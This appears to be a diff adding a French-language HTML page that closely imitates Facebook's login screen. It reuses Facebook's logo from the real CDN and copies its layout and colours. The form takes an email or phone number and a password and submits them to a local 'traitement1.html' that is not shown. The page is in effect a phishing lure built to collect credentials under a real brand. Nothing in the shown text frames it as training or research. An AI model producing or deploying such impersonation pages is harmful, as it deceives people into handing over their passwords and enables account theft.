@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Connexion à Facebook</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        :root {
+            --fb-blue: #1877F2;
+            --fb-gray: #F0F2F5;
+            --text-primary: #1C1E21;
+            --text-secondary: #606770;
+            --border-color: #dddfe2;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: var(--fb-gray);
+            color: var(--text-primary);
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .fb-logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        
+        .login-title {
+            font-size: 18px;
+            font-weight: 500;
+            color: var(--text-primary);
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            font-size: 16px;
+            background-color: var(--fb-gray);
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .btn-login {
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            margin-bottom: 15px;
+        }
+
+        .forgot-password a {
+            color: var(--fb-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--text-secondary);
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .divider:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .divider:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .btn-create-account {
+            background-color: #42b72a; /* Facebook green */
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            width: auto;
+            padding-left: 16px;
+            padding-right: 16px;
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 30px;
+        }
+         .footer-text a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="fb-logo">
+        <div class="login-title">Connectez-vous à Facebook</div>
+        <form action="traitement1.html" method="GET">
+            <input type="text" class="input-field" placeholder="Adresse e-mail ou numéro de tél." required>
+            <input type="password" class="input-field" placeholder="Mot de passe" required>
+            <button type="submit" class="btn-login">Connexion</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+        <div class="divider">ou</div>
+        <button type="button" class="btn-create-account">Créer un nouveau compte</button>
+    </div>
+    <div class="footer-text">
+        Français (France)
+        <a href="#">English (US)</a>
+        <a href="#">Español</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">Deutsch</a>
+        <a href="#">Italiano</a>
+    </div>
+
+</body>
+</html>
